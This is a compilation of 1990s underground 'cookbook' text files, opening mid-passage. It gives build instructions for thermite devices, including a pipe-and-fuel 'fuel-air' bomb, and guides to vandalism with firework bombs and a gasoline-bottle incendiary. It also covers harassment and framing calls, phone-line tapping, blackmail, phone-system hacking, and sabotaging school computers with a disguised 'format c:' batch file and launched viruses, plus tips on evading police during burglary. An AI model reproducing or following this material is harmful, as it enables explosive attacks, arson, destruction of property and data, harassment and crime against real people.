sticking out of the ball. Dry the ball in the sun for about a week.
DO NOT DRY IT IN AN OVEN !
The fuse ignites the first fire mix which in turn ignites the thermite.
Since the thermite is ignited from the center out, the heat builds up in the
thermite and it burns faster than normal. The result is a small explosion.
The thermite ball burns in a split second and throws molten iron and slag
around. Use this carefully !

THERMITE WELL: To cut metal with thermite, take a refractory crucible and
drill a 1/4 in. hole in the bottom. Epoxy a thin (20 ga.) sheet of mild steel
over the hole. Allow the epoxy to dry. Fill the crucible with ferro-thermite
and insert a first fire igniter in the thermite. Fashion a standoff to the 
crucible. This should hold the crucible about 1 1/2 in. up. Place the well
over your target and ignite the first fire. The well works this way.
The thermite burns, making slag and iron. Since the iron is heavier it goes
to the bottom of the well. The molten iron burns through the metal sheet. 
This produces a small delay which gives the iron and slag more time to 
separate fully. The molten iron drips out through the hole in the bottom of
the crucible. The standoff allows the thermite to continue flowing out of the
crucible. The force of the dripping iron bores a hole in the target.
A 2 lb. thermite well can penetrate up to 3/4 in. of steel. Experiment with
different configurations to get maximum penetration. For a crucible, try a
flower pot coated with a magnesium oxide layer. Sometimes the pot cracks
however. Take the cast thermite formula and add 50% ferro-thermite to it. 
This produces a fair amount of iron plus a very liquid slag.

THERMITE FUEL-AIR EXPLOSION: This is a very dangerous device. Ask yourself
if you really truly want to make it before you do any work on it.
It is next to impossible to give any dimensions of containers or weights
of charges because of the availability of parts changes from one person to
the next. However here is a general description of this device affectionately
known as a HELLHOUND.
      Make a thermite charge in a 1/8 in. wall pipe. This charge must be 
electrically ignited. At the opposite end of the pipe away from the ignitor
side put a small explosive charge of flash powder weighing about 1 oz.
Drill a small hole in a pipe end cap and run the wires from the ignitor 
through the hole. Seal the wires and hole up with fuel proof epoxy or cement.
Try ferrule cement available at sporting goods stores. Dope the threads of
the end caps with a good pipe dope and screw them onto the pipe.
This gives you a thermite charge in an iron pipe arranged so that when the 
thermite is electrically ignited, it will burn from one end to the other
finally setting of the flash powder charge.
Place this device in a larger pipe or very stout metal container which is
sealed at one end. Use a couple of metal "spiders" to keep the device away
from the walls or ends of the larger container. Run the wires out through
the wall of the container and seal the wires with the fuel proof epoxy.
Fill the container with a volatile liquid fuel. Acetone or gasoline works
great. Now seal up the container with an appropriate end cap and it is done.

The device works like this: Attach a timer-power supply to the wires. When
the thermite is ignited it superheats the liquid fuel. Since the container
is strong enough to hold the pressure the fuel does not boil. When the
thermite burns down to the explosive, it explodes rupturing the container
and releasing the superheated fuel. The fuel expands, cooling off and 
making a fine mist and vapor that mixes with the surrounding air. The hot 
thermite slag is also thrown into the air which ignites the fuel-air mix.
The result is obvious. Try about 1 1/2 lbs of thermite to a gallon of fuel.
For the pressure vessel, try an old pressure cooker. Because the fuel may
dissolve the epoxy don't keep this device around for very long.
But ask yourself, do you really want to make this?


EXOTIC THERMITES: Thermites can also be made from teflon-magnesium or metal
flourides-magnesium or aluminum. If there is an excess of flouride compound
in the mixture, flourine gas can be released. Flourine is extremely 
corrosive and reactive. The gas can cause organic material to burst into
flames by mere contact. For teflon-magnesium use 67% teflon and 33% magnesium
A strong first fire igniter should be used to ignite this mixture. Both the
teflon and the magnesium should be in powdered form. Do not inhale any
smoke from the burning mixture.
If you use metal-florides instead of teflon, use flourides of low energy
metals. Lead flouride is a good example. Try using 90% lead flouride and
10% aluminum.
Warning: Flouride compounds can be very poisonous. They are approximately
equal to cyanide compounds.
Another exotic mix is tricalcium orthophosphate and aluminum. When this 
burns,it forms calcium phosphide which when contacts water releases hydrogen
phosphide which can ignite spontaneously in air.
Tricalcium orthophosphate has the formula Ca3(PO4)2 and is known as white-
lockite. Use about 75% orthophosphate and 25% aluminum. This ratio may have
to be altered for better burning as I have not experimented with it much and
don't know if more aluminum may reduce the calcium better. It does work but
it is a hard to ignite mixture. A first fire mix containing a few percent 
of magnesium works well.

Fighting thermite fires: Two ways to fight thermite fires are either 
smothering the thermite with sand. This doesn't put out the thermite but it
does help contain it and block some of the heat.
The other way is to flood the thermite with a great amount of water. This
helps to break the thermite apart and stop the reaction. If you use a small
amount of water, an explosion may result as the thermite may reduce the water
and release hydrogen gas.
Thermite can start fires from the heat radiating from the reaction. Nearby
flammable substances can catch fire even though no sparks or flame touch 
them.

              Fun vandalism - things to do when you're bored
                (Hey you, yeah you, your Disclaimer HERE!)

(Please forgive the grammer in this oh such fun document, i was laughing like)
                           (hell while typing it)

        Ah yes everyone now and then just want's to get some pressure off(yeah
right, uh-huh, we all know what we're after, to make some poor schmuck's life
a living hell). Well what can we do to some loser. Well here's are a few 
examples, and trust me from experience never do night-by-night vandalism, 
unless no one absolutly sees you or is even suspicous. Oh yeah if you're gonna
do any type of vanadalism make sure it's aa night(as yes that means where dark
clothes, don't be the dumb schmuck wearing bright neon colors, you might as 
well yell to the police hey watch me over here while i do some vandalism. It 
just doesn't work out good for you, if you must bring a flashlight make it a
small one, something that'll fit into your pocket. Ok here we go...

        1) Heh does that annoying loser you know have one of those mailboxes
                on a piece of shit wooden post? Well we can fix that many
                ways. My favorite just knock the damm thing off, then a couple
                blocks away put it in the middle of the road when no one's 
                looking, it's get's even better if it's right in front of
                thier house and they run it over themselves!!! Watch them get
                all pissed while you're watching off from a distance laughing
                telling your freind to pass the pop-corn.
                What don't like breaking off people's mailbox's? Well how about
                purchasing yourself a nice Pineaplle(or two, and we all know
                where to get them, from Chinatown of course, well if you can get
                to hoboken or directly to World Trade Center it's just a couple
                blocks away from the Twin Towers, take the train, bus whatever
                just make sure you have one of your Bud's with you, more than
                one wouldn't hurt, when purchasing them never go for the price
                they say rip them off, never go for the price they give you how
                insulting, heh heh), anyways make a nice long extended fuse a
                paper towel twisted up nice and tightly over the wick does a
                nice job for a couple minutes to get away, or if you're lazy
                attach a cigarrette to the fuse. Then go to the oh so famous
                mailbox leave your little welcome card(the pineapple, and yes
                the light the wick), ring the door bell, run like hell, then
                watch them cry as their mailbox blows up in their face.

        2) Ever wanted to break a window without rocks, well get your hands on
                a pineapple and some pretty strong tape and a extended fuse.
                attach the extended fuse(like in #1) to the wick, then with the
                tape(were gloves when doing this just in case, heh heh) the
                pineapple with the extended wick on it to the window, light
                and run like hell. Get a safe distance where you could make
                yourself sorta disappear out of sight, then watch as the
                window get's a nice blow job, err oops i meant blowup job, heh
                heh.

        3) So this loser has a car eh? Gee these can be so much fun the fuck up.
                Why that you ask, well simply put you can do more damage to a
                car then a mailbox, heh heh, here's some examples. What's this
                an open window on the car, heh well no one's looking or even
                around take a nice long leak onto those nice leather seats. Whoa
                what a stench glad that ain't my car! Heh heh, need some glass
                for god knows what? well don't break the card window's instead
                get a plunger, suction it onto the window and then with the nice
                glass cutter you have gently cut out a nice piece(s) of glass,
                ahh for the hell of it cut out some words like, "Fuck you", or
                "Anarchy rulez", then as an added bonus, whats that the pieces
                of glass you have you feal nervous taking them, oops oh well now
                that i've dropped then in the street some other schmuck has to 
                clean it up. Oh well heh heh. Oh yeah before i forget one of my 
                favorite, get's some high grade cement all ready mixed and 
                something to put it in to pour it out with. Then with some 
                really strong tape(use electrical tape) pour the cement into the 
                tailpipe, then put the masking tape over the end let dry, and 
                let's see the fucker try and get anywhere's with that stuck in 
                his tailpipe. 
                
        4) Bottles, bottles, bottles... what are they good for, lot's of things.
                you may be thinking well let's drop some in the road. well 
                there's even more fun you can do with them, for instance with 
                some gasoline pour it into one of the glass bottles, then tape 
                a pineapple with some masking tape onto the side of the bottle 
                now filled with gasoline, and for god's sake make sure there's 
                no gasoline on the outside of the bottle. Then with a, i mean 
                REALLY!, extended fuse attach it to the wick of the pineapple 
                then put on someone's door step or wherever you think change 
                would be nice(heh heh), light and get the fuck out of there, you
                wanna be atleast about 100ft away god know's how big of an 
                explosing that'll make. 

        5) Payphones what can we do with these, why annoy the hell out of an 
                operator, call up 411, ask for a "Yes i'd like the number for 
                a Last Name:Anus, First name:Your" when she comes back on(if you
                get the stupid one, she/he'll probally say something like, "I 
                don't see anything under Your Anus.", then either laugh or say 
                something like (if you get a male) "I'll you faggot!", (a cute 
                sounding female) "Well if you'd like to check under my anus 
                again just give me the time and place". And if you get an old 
                bitch just hangup. Before leaving you just so happen to be next 
                to the guy who's talking alot on the payphone get wouldn't it be
                a shame if was interrupted by someone calling the pay phone you 
                just got off of? Well let's do it anyways dial 550 and the last 
                four digit's of the phone number, listen for dial tone, then 
                gently click a couple times until you hear a low pitch noise, 
                hangup walk away. Watch the fucker talking so much on the other 
                phone get pissed answering the other phone that's ringing like 
                hell, and there realize's when he picks it up no once called and
                the person he was talking to hangup on him/her. Or better yet 
                instead of even doing that twist off the mouth pieces, heh heh 
                that'll piss off anyone who needs to use a payphone in a hurry 
                and there's nothing to talk into! Heh it's even better if you 
                could sell the mouth piece and ear piece to some schmuck that 
                thinks it's a portable radio for about $30! Heh that's a good 
                way to make money.

        6) Damm street lights, too fucking bright eh? Gives off where you are?
                well if they're those short gas-light ones you're in luck, well
                someone going to have to replace the broken glass, heh after you
                break it. Oh yeah before breaking any glass make sure you plot 
                out a place where you're gonna run and hide at. This way if a 
                cop comes while you're doing it, he won't find, well that all
                depends on how good you can hide and what you're wearing, ie...
                don't be the dumbass with the bright clothes on trying to hide
                in a bush just doesn't work.

        7) What the loser you're driving mad is happyily married. Well we can
                change that. How is this, from a payphone call up the person
                you wanna ruin, then ask if his wife is there(works better if
                you know his wife's last name and his first name), then do the
                following, "Hello is a Mrs. I'm a bimbio there? may i please
                speak to her", "Who might this be calling?", "oh it's her old
                boyfriend, Joey, wow you must be the lucky man that married her?
                boy she realy knows how to give a blow job, oh and that little
                teddy that she wears without the panties,ummm ummm ummm", heh
                listen outside the house for a while, and listen to the oh so
                interesting argument.

        8) Wanna get someone framed. Well dial 411. as play out the dialouge
                below.

                OPERATOR:Hello what town and name please
                YOU:Hello this is <Your victim's full name here>, what's your 
                    name
                OPERATOR:<confused> uhh it's Pam Johnson(whatever)
                YOU:Well Pam Johnson, i wanna fuck you, and if you don't give
                    me your address now i'll just look it up in the phone book
                    book and come over your house and jump you when you least
                    expect it, and don't try tracing this call(do this from a
                    payphone for crying out loud!), if you ever find me i'll
                    just deny anything you say. Then i'll find you and fuck 
                    you over.

                heh watch your the victim(the person you said you were) be 
                harrassed and shit for no reason at all. Kinda of stupid but
                if you're convincing enough there'll be trouble heh heh.

        9) Are trash can's any fun well if you can pick it up and carry it 
                around that is, have fun dump some of the half eaten crap onto
                someone's front porch, hell dump the whole can on it, ring the
                doorbell, watch some old guy come out and say "whoa what a 
                stench!", and if you wanna be cute light it up. Only light it
                if you're really, really pissed off at this person.

        10) Can i do anything with this loser's phone lines? Well that all 
                depends, you wanna eavsdrop and snoop, and record what you
                learn of onto tape or something and blackmail the fucker(not
                original but you make some sort of profit out of it, depending
                how private it is), or if you're just totally pissed at that
                person just snap the phone wires(the small ones idiot! Don't
                do any of the fat thicks ones unless you like getting fried
                to death), heh watch as it cost him money to get the lines
                fixed. Or better take two losers phone lines and switch the
                lines, so the one loser get's the other loser's calls.

Well that's all for now, heh that out'ta keep you entertained for a while! Be
on the look out for more uSu releases soon.

            Phone Scanning for those who don't use war-dialers
                (Hey you, yeah you, your Disclaimer HERE!)

        Scanning for those who don't like war dialers is mostly for scanning
800#'s,(if you don't know what scanning is then please get a HPAVC education
course first before you read this) as i was saying, 800#'s can be fun to scan
and dangerous at the same time. Here are some of the most basic pointers.

        1) Scanning 800#'s from your home phone line is not only stupid but
                can probally get you in a shitload of trouble, most 800#'s
                have ANI(Automatic Number Identification) systems on them
                and these are a bitch, because once you find a good 800# that
                you're going to play with from your home phone you're just 
                going to get yourself in major trouble, especially if it's an
                extender. If you're going to do 800# scanning by all means 
                don't be stupid use different payphones from time to time so
                your chances of getting caught are less. Scanning at night
                might be a bit hard because you'll probally have a hard as 
                hell time trying to look at the number's. Just use one 
                payphone and make about 10-15 800# calls then move to the next
                alternate, don't use the same exact payphone everytime.

        2) When looking for interesting numbers don't start from 800-XXX-0000
                all the way through to 800-XXX-01000 or 9999, etc... be 
                creative use numbers like the below(note these aren't real #'s
                just examples)....

                        1-800-EAT-SHIT
                        1-800-NOT-4YOU
                        1-800-999-9999(The 9 line, dial itm and yell rape!)
                        1-800-THIS-SUX
                        1-800-YOU-FUCK
                        1-800-OHMY-GOD
                        1-800-FOR-PLAY

                etc... you get the idea just be creative, and allways remember
                what you dialed last, i once got some number that was security
                and procedures for some Penal colony(Prison).

        3) If you get an operator or one of those stupid personal 800# lines
                where family and friends can call for free, just ask for Joe
                or someone, and sometimes you might even get a reply, "Yeah,
                hello this is Joe what's up?", or "Joe's not home now try l8r"
                , etc.... anyways if it's something like a voice mailbox write
                it down and remember it, then hack the VMB later on. Hell use
                it for yourself. Tho i wouldn't suggest doing it so because
                someone else who know's how to hack VMB's will probally do it
                to your mailbox and listen to your messages. If you know what
                you're doing with VMB's you can blackmail people.

        4) You must be patient don't give up on the first try and get a busy
                signal, try your 800-and your last 7 digit's, try friends #'s
                try anything just have fun, that's what scanning 800#'s is for!

        5) Never be rude to someone else, otherwise they'll probally get pissed
                to all hell and have your number traced, well it don't matter if
                you're doing it from a pay-phone. But don't get them all siked
                and get more protective shit for their line. You may just may 
                have to hack out some stuff from them if they run a BBS or PBX
                at night, perhaps free phone calls.

        6) If you're going to be hacking 800#'s please read USU-003.TXT on 
                hacking 800#'s.

Peace i'm out'ta here look for more uSu releases in the near future


For The CookBook IV, 4.50uSu - united States underground                         By:Cyberglitch

                          Basics for Hacking 800#'s
                (Hey you, yeah you, your Disclaimer HERE!)

Hacking 800#'s can be pretty dangerous, since well most 800#'s have ANI, and
well your # appears at the 800# you're using. Well listen up dude, if you
don't wanna get caught hacking an 800# then read up. Ok first thing you need
definately when hacking an 800# is a Laptop(no not VGA Color and shit, a 
plain simple old Monochrome monitor with a 9600 or 14.4 will do, and yes a
terminal program would be helpful). Next you'll need someone's line you can
use so if you're getting into something big then fucker who owns the line
will take the heat for you. Go to a poll or better yet find the main box in
your town and tap into a line, using an unused one isn't a bad idea but 
that'll raise suspicion that someone's playing around with MA BELL's phone
boxes. Anyways get you Laptop already with your modem and some phone cord 
with aligator clips and all, bringing a handset along is also helpful but not
totally nessary. First choose a line i don't care how you do it just eni-meni-
mini-moe for all's i care. Then find out the # by dialing 958 for NJ, i'm not
sure what it is for other states but knowing the BELL standard it's probally
the same. Once you find out the line number call up your freinds at CN/A and
find out who owns the line their name is all you really need, an address would
be helpful if you wanna make them look bad by carding shit to their house in
big orders to get the FEDs all fired up. Or use the info you obtain for
phreaking purposes, or go as far as blackmail the person(once you find
something juciy on them) not to use their phone line at certain times(tho i
highly recommend against this since it'll get them suspicous as to what you're
doing, just tell them something like don't ever use your phone line ever. The
only purpose for this is so if you hack a PBX or Extender you won't have
someone pickup the phone while your DL'ing or UL'ing something. Next once
you're all set make sure no one know's where your spot is, put tape or 
something that'll warn you(if moved) that some one else was there, once you
know that someone was at your spot find another one, this way les chances of
being caught for a while, you might wanna lay low for a copuple of days or a
week to keep suspision down. Ok now scan for some interesting number's(read
USU-002.TXT for scanning tips, or use a war-dialer). Ok once you find some
interesting numbers remember the following

        1) After all the work you've gone through to get a secure line and
                spot, don't let some ashole you call say i'm going to hunt
                you down then move your spot, nononono that's a waste, only
                if you're one of those people who want's to play it super
                safe. If you reach some phone company executive find another
                spot, otherwise your ass will probally be nailed really quick
                since they'll get pissed and they know(and have a staff) that
                know's the phone system better than you do.

        2) If you get someone on the line voice(whether it be one of those
                800#'s owned by someone) allways act cool, don't say something
                stupid like "Heh heh don't mind me i'm just prank calling".
                Doing something like that only spells getting caught fast!

        3) If you get a carrier signal use your laptop on the next call. See 
                if you can connect to it, if you do and it's a UNIX or VAX or
                hell even a PBX then write that number down! Allways make
                sure you write it down on your computer never or paper, mostly
                because of fingerprints, and that you can format you HD faster
                than you can tear up paper.

        4) Once you find a VAX/UNIX or PBX spend some time hacking it in 
                sessions of random times, don't do it like everday at 8:00pm 
                that'll get you caught to. Listen dude you got'ta play the
                game safe. Being random is the way to go, hell make several
                hack attempts at servals VAX/UNIX or PBX #'s you've found.

        5) Allways remember once you've succesfully hacked a PBX only tell the
                people you can absolutely trust, people who don't crack under
                the heat of a FED or a Cop. Or better yet don't tell anyone
                else at all. The only advantage to letting more than yourself
                know about a VAX/UNIX/or PBX # is so they may also use it to,
                to keep the people who own the 800# guessing who's trying to
                hack it. Hopefully this is what will happen, you and the
                people you trust to use it will get a couple days, maybe
                weeks of couriering in and then the people who own the 800#
                will just simply take it down because they have no idea who
                exactly hacking their number, and thus no one get's the FEDs
                or Cops on their ass.

Look out for more shit from uSu in the near future, Cya,

 What's uSu, well simply put it's the united States underground. It's a  
 serious H/P/A/V/C/T/L group with an attitude. Founded by Cyberglitch on 
 August 19, 1993. Why did Cyberglitch form this group, good question,    
 and hopefully to you a better answer. Cyberglitch got tired and fed up  
 with all these other lame H/P/A/V/C/T groups going around and writing   
 about bullshit crap, that never would of worked, or is way out-dated.   
 So Cyberglitch sat down one day and said, if i can't stop these lame    
 groups then might as well make a group that would release decent Text's 
 that people would wanna read and that they can try themselves. Nothing  
 like, drop a nuclear warhead and see what it does. Althought that might 
 fit somewhere into the Lit. Department. Well anyways, I'm hoping you    
 enjoy the uSu Articles as much as my group enjoys writing them. And hey 
 if you submitted some kickass articles they'll probally be releases by  
 uSu. And if we like enough we might ask you to join. Who know's!        
                                                                         
                               Why uSuNet?                               
                                                                         
 Well this was also started by Cyberglitch, to help other H/P/A/V/C/T/L  
 people like you reach us easily. You may obtain a uSuNet packet by      
 FREQ'ing with your mailer to Crainiul Shutdown with the magic name      
 `USUNETAPP' for the latest nodelist packet. It is my hope that enough   
 people join uSuNet to make it easier for you the reader to contact us.

     Why NJ Bell(Bell Alantic) and other local phone companies suck!
                (Hey you, yeah you, your Disclaimer HERE!)

        For all you Phreakers out there this text-file could be invauleable
to you. Why do NJ Bell and other Local phone companies suck? Well that should
be obvious, first here are some of the reasons why...

        1) Local telephone operator's have your phone number even before your
                call goes through, even if you do a collect call.
        2) They usually know you're bullshitting when you're trying to rip
                them off, because they know were you probally live and all
        3) Who else could bring you down besides your local calling company.
                you wouldn't call a LD PBX for free phone calls, that'd 
                defeat the purpose.
        4) Most NJ Bell loops have Collect Call block
        
        What's Collect Call Blocking? If ya don't know lemme explain, most 
Local companies and LD phone companies have auto-matic collect call systems, 
which are great because you the local person to a loop can call it and have 
your LD friend call the other end collect, and then you can say you'll accept 
the charges, well it sounds great doesn't it? Well here's the problem, if the 
loop your friend(or you, doesn't matter as long as someones local to it) is 
trying to call collect won't go throught because it has collect call block 
then you're fucked! What usually happens is that the call won't be handled by 
the auto-matic system it'll call an operator on-line. And that can mean 
trouble for you, especially since the operator will probally know what 
you're up to. And if you're stupid you'll try it from home phone, OH WHAT 
CAN IT HURT TO TRY? Well i doubt you'll get into any real trouble you'll just 
have your local phone company suspicous about you and where you call, so save 
yourself the bother tell the operator oh i'm sorry i messed up in dialing the
number or do it from a payphone. 

        Caller-ID? Don't you just hate calling those lame BBS's that have 
that? It's annoying when some piece of shit PD BBS Sysop says, "heh heh i got
your real number!". Well yeah i'm sure just dialing *67 for Caller-ID Block
would help you out with that problem, but guess what? By using that it'll
cost you a $1, whoa big deal you say. Well don't forget this all Caller-ID
customers can activate this feature called Caller-ID Block Blocking, which 
in when you try to call their number using Caller-ID Block will announce a
message saying this number doesn't accept Blocked calls. Yeah so you say,
DAMMIT! IS THERE ANY WAY AROUND IT? Well Yes and No, Yes you can get around
it call up the operator and tell her you don't think the number you're calling
doesn't seem to be working, and that you'll aceept the cost of the call. Well
that'll work since most Caller-ID Bell services cannot ignore and operator 
routed call to that number, even with the Caller-ID Block Blocking on(what's
to block? Nothing the operator's number doesn't show up, because she don't
have one!), but anyways the problem is that if you don't get a voice number
then you're screwed because almost every operator will tell you "It's sounds
like there's something wrong with the number you're trying to reach". And
the other bad part, it'll cost you more money to route the call through the
operator. You can most certainly try doing a collect call from a payphone 
but i doubt any sysop has a modem that says "Yes i'll accept the charges".

        What fun is 958(or whichever number it is for your state's ANI system
, and ANI stands for Automatic Number Identification system), these are a 
pain in the ass since most 1-900 and 1-800 numbers have them(there are 
different types of ANI levels 1-5, the one that you get when you dial 958 is
probally a level 4 since it only tells you your exchange and last 4 digits
of the number you're calling from), ANI's are great if you broke into a one
of the phone boxes in your area and phreaking a phone line that's someone 
else's or not in use, since it'll tell you the number you're calling from.
But the problem is that if you're gonna be dumd enough to scan 800#'s from 
your home phone you might as well call up your local operator and tell them
"Hey can you tell me some PBX numbers?", sorry pal it just won't work. 

        Operator's can sometimes be cute, with the such famous question as
"What number are you calling from Sir/Ma'am(whichever)", they just ask you
to see if you're being honest, and sometimes they'll be a bitch if give them
a false number and they'll probally hangup on you. 

        One of the stupidest things that anyone could think of doing is 
trying to rip off your local phone company. HELLO WAKEUP HERE! Your local
phone company know's all about you(especially if you're calling from your
home phone line), and well they kind find you faster then AT&T, MCI and 
SPRINT can, because well AT&T, MCI and SPRINT are long distance carriers not
local carriers, they don't know much about you, they may know your number
from their ANI system, but that's about it the only way they can get your
real information is by well calling your local telephone company. But usually
your local phone company will give them hell, since most local companies 
don't wanna have anything to do with them. And basically the chances of a LD
company getting your real name and address is very slim unless you give it
to them, like it's been said before, then only people who get caught are the
people who admit what they did, that's why FEDS and Cops tell you to talk,
and they have evidence(this quote thanks to Telsa), to convict, HELLO 
WAKE-UP! If they had enough evidence they wouldn't even need you to talk.
Don't be a fool, don't be suckered by them, 99% of the time they have no
clue what you did, unless they were actually there watching you do it.

        Oh yeah did i forget to mention most local companies have these 
great calling plans for calling anywhere in the your state with a special
discount rate or something, well NJ Bell could have something like that, but
they don't. Do you know why? I'll tell you why, because of some stupid state
law that doesn't allow them to do that. Ok yeah that sounds like a good 
answer to me, but when i asked which state law, the operator could only say
"I dunno". Gee maybe that's because there is a fucking plan, but NJ Bell
won't tell you that, and why should they when they're ripping money off of
you. In some places in NJ it costs like $1.39 a minute, and that's just the
night rate!!!(You know 40% off). Frankly that's insane, because AT&T can get
you a special rate to call anywhere in the US for only $.10 a minute!!!

        Well peace, check out the next issue, how to harass, and severely
fuck over NJ Bell and other local phone companies. Cya

  directly or indirectly relating to this textfile.  If you cannot do this, do
  not read this. This file is for information purposes only.


How to fuck up a School Mainframe:
               Courtesy of:
               ThE aNaRcHiSt


The most unaware, stupidest, computer systems in the world have to be
computers at schools, high-school and middle-school especially.  The coolest
way to fuck up their computers are virii.  Now this little textfile will give
you all the information you need to become a full-fleged HPAVCTE`er.

1.  Getting into DOS

    There isn't one school I know of that doesn't have Direct Access on it.
Which is when you boot up the computer, it doesn't go into the OS, but right
to Direct Access.  The School wants you to think the only way to get into DOS
is to find out the exit to dos password.  There are so many ways to overcome
this problem.  You could do Control+Alt+Delete to reset the computer, and when
you see:

Starting MS-DOS...

Press Left-Shift many times, this should override DA5 and put you right into
DOS.  Another way to do it is to go into the typing program, open the file:
C:\AUTOEXEC.BAT, and take out the last word which should be MENU.  Save it in
ASCII format and reboot the computer.  The other way is to just launch the
viruses from Windows--->Main---->File Manager.


2.  Take all precautions.

    Sometimes if there has been trouble before concerning computer virii, the
school may stress abit of caution.  But I guarantee, if you can't overcome
this caution, don't read this textfile.  Some of the time, if the scool
suspects something, they will do a routine virus scan on all of the files.
Now, there are many ways of overcoming this little problem.  First you can
just delete all of the .EXE, or .COM files in the directory containing the
scanner.  Usually they will use the scanner that comes with dos.   These files
will be MSAV*.* which are all the scanning files in DOS.  Others used are
McAfee's SCAN, but they probably won't use it because in order to use it in
school it must be registered, most schools are too cheap to register software,
so you don't really have to worry about that.
    Instead of just deleting the files you can go into MS-DOS editor, or
Qbasic to edit the .EXE's or COM's.  The most creative way to fuck these up is
to just type a bunch of bullshit in the file with OVR on.  The other way is to
copy all of the bullshit of another program such as dosshell or format to the
MSAV*.* files.

    The funnest way though is to delete the .EXE files, make a batch file
with the same name as the .EXE that contains:

format c:
ECHO y
ECHO You're Computer is FRIED!!!! Motherfucker!

This little batch file will format their main Disk Drive and you won't even
need to launch viruses.


3. 3-2-1-0 Liftoff, Virus Launch!

Now for the really fun stuff.  Obtain as many viruses and trojans you can fit
on a disk from your favorite HPAVCTE BBS.  After you have all the viruses on a
disk make batch file called RUN.BAT and in it put all of the .COM filez that
launch the viruses, Example:

kinison
vmessiah
pearlhbr
dontello
ECHO HAHAHAHAHAHAHAHAHAHAHAHAH!!!!

This Batch file will launch all of your viruses and nobody will suspect
anything.  But just to be safe, don't be a putts and label the disk:

VIRUSES THAT I WILL
LAUNCH ON THE MAINFRAME

or something because if someone sees that disk It'll be all over.  So play it
safe and label it:

DOS GAMES
TYPE "RUN" AT
PROMPT

They won't suspect a thing.

4.  In Conclusion

    If someone happens to pickup the viruses with a scanner, there is still a
way to get revenge.  Find one or two disks of the school's and replace alll of
the COM or EXE files with the viruses and rename the viruses to what the name
of the COM or EXE wuz.

    This concludes my textfile on Virii and Trojans.  Have Fun!!

I gotta try this one.. -mdn '95uSu - united States underground                         By:Cyberglitch

                 A serious Phreaker's guide to phreaking.
              (Disclaimers suck, they just a waste of space)

        To be sucessful in Phreaking yuo must remember the __ commandments 
of Phreaking, and those are...

        1) Phreaking should only be done from Payphones, the lesser chance
                of getting caught this way.

        2) Use different payphones at different times randomly, never let a
                pattern build up, this will ever so much help you from being
                caught

        3) Gloves will help you even more, take like $1.59 and buy vinyl 
                gloves from Pathmark, just make sure you don't leave prints,
                don't waste money on a expensive pair since you make have to 
                dispose or burn them in a hurry. Leaveing no fingerprints
                gartuntees that there was almost no physical evidence you
                were there.

        4) When phreaking someone never phreak them on an answering machine,
                because they'll probally take that first to the police.

        5) Try and disguise your voice, place a napkin or plastic over the
                reciever, though try not to look suspicous :)

        6) Phreaking when no one's around is also a good idea, since that 
                way no one or rarely anyone can identify if you were even at
                the payphone the harassing call came from.

        7) Never make a phrank call over 3 minutes, by that time being passed
                a trace could be completed, don't take the chance. MAke your
                phrank call short, brief and straight to the point.

        8) Avoid operator's they more trained in these situtations then the
                person you're trying to Phreak. And well they'll get the
                number you're calling from really quick, who know's they could
                even bother to call the police to the payphone.

        9) When leaveing a payphone wipe the phone surface clean of prints that
                might of been left, restore the payphone to the way it was.
                Because then the person there before you can say well this
                phone doesn't even look like is was touched, as if you'd 
                never been there.

        10) If you get caught, allways, allways remember admiting what you
                did get's you in trouble, if you hold out on the police, 
                they'll have nothing on you, and well if they keep you long
                or even force you to admit what you did, sue them for 
                harassment. 

        11) Allways phreak alone, it only gives you away when you're trying
                to piss someone off if your friend is laughing in the 
                background. 

        12) A good tip, phreak some bastard a couple minutes after he/she
                goes to sleep, they'll be so irritated and confused at that
                point that they may forget what has just happened, and if
                the timing is right scream like hell into the phone, you
                must just give the old bastard a shock or two :)

        Look out for a lot more new stuff from uSu, future articles will
include Operation uSu-AG, united States underground-Anti Government, for all
you revolutionist's out there. And yes hopefully a new compiled list of the
CNA number's for NJBell, CNA #'s are very handy, and are so invaulable at the
moment, but chances are buddy, you might have to be calling long distance in
order to take advantage of them :(.


You Guessed It.. '95 4.50uSu - united States underground                         By:Lurch

                     "How NOT to get caught..." 

Ok, well, this is a sorta weird document.  I wanna explain to those who do not
yet  know, how NOT to get caught in various situations.  For those who have no
clue,  this will be most helpful, for  those with some knowledge, this will be
educational, and for those with experience, this might give a tip and a couple
of nice laughs over old times and getting caught.

This document  is in the general order  of elite.  HPACTVE.   As far as I have
always knows,  that stands for  Hacking, Phreaking,  Anarchy, Carding, Trojan,
Virii,  and Elite.  Now,  in the past few  months I've  been hearing different
variations,  like  the T standing for  Trashing, or Term  Papers, and the P as
standing for Piracy, I dunno, I do this the way I do know.

    Hacking
    -------
Ok, all of this advice came from personal experience, so, read carefully.
One.  Always delete logs.  If you do not know a system, and where and how 
logs are kept, don't break into it.  Most systems have running logs, and,
believe me, you don't want to be caught on something as stupid as that.  Two.
Make sure an operator is not there when you are doing something remotely.  I
guess the reason for this is pretty obvious.  Three.  If doing something
remotely, make sure you use something that will not let anybody trace you.
NOTE:If you call through a dial-out, be careful, some of those have caller
IDs, and, however funny it is, those things are the ones that catch you the
most.  Four.  Don't leave something to activate later.  If you are formatting
a hard drive, do not be stupid enough to say "Press Y to continue formatting 
the drive", and watch somebody press it.  Most of the time, the computer will
get turned off, and the damage will not be done.  I hope I made that clear.

    Phreaking
    ---------
Ok, since there are NO rules in phreaking, I'll just say that whatever you're
doing, do it quickly, tracelessly, and effectively(so you can have some fun.)
My idea of fun is hitting mail boxes with bats, yours might be taping stink
bombs to the bottoms of purses, or putting water baloons on the top shelf
of lockers.  I dunno, you figure it out, just have phun, and don't get caught.

    Anarchy
    -------
Ok, a few tips about trashing things with explosives.  Number one rule, 
DON'T be close to the place at the time.  All of those text on making 
explosives are VERY dangerous, in fact, some underestimate the power.  A car 
can turn upside down if you put some shit under it, which would cost 2 cents
to make, so, I really don't advise you to be there.  Two, NEVER come
back to see what happened.  Let's say you fucking break a window, DO NOT do
something stupid like climb in it!  Three.  Don't use loud objects!  If you
wanna bring down a telephone post, do it with an explosive, don't do it with
a chain saw.  If a person hears you start a chain saw, they'll call the damn
police office, and you're history.  Four.  Don't leave evidence.  No matter
what kind.  Don't leave your trace, don't put a paper saying "The midnight
trashers did this", because, if you get caught, many cases can pile up against
you instantly.
Ok, some stuff about robbery and general breaking and entering.  One.  ALWAYS
wear gloves.  You can get 10 for a buck 30 at Shop Rite, or you can spend a
night in jail.  Your choice.  Two.  Don't take anything that's valuable.  
This is due to you NOT being able to sell it, and if you even could, the 
ability to trace you.  I mean don't take anything over $50000, DUMBASS!  If
you steal a priceless gem, which I doubt you will, you won't sell it.  Three.  
Don't leave a note, read the reason in the vandalism section(trashing things).
